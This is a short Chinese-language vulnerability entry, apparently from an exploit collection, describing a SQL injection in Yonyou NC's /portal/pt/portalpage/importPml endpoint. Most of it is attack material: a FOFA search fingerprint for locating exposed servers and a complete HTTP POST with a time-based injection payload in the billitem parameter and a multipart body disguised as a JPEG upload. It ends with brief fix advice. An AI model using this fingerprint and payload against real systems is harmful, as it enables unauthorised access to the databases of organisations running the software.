# 用友NCimportPmlSQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="1085941792"`
- **请求**：`POST /portal/pt/portalpage/importPml?pageId=login&billitem=1'WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`

**请求体 / payload**
```
1. Fofa
icon_hash="1085941792" && body="/logo/images/logo.gif"
2、隐患url,复现如下
Host: your-ip
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
------WebKitFormBoundaryH970hbttBhoCyj9V
Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
Content-Type: image/jpeg
<?xml version="1.0" encoding="UTF-8"?>
<page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true" skin="webclassic" level="0"  linkgroup="0000z010000000000002"  ordernum="15">
</page>
------WebKitFormBoundaryH970hbttBhoCyj9V--
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。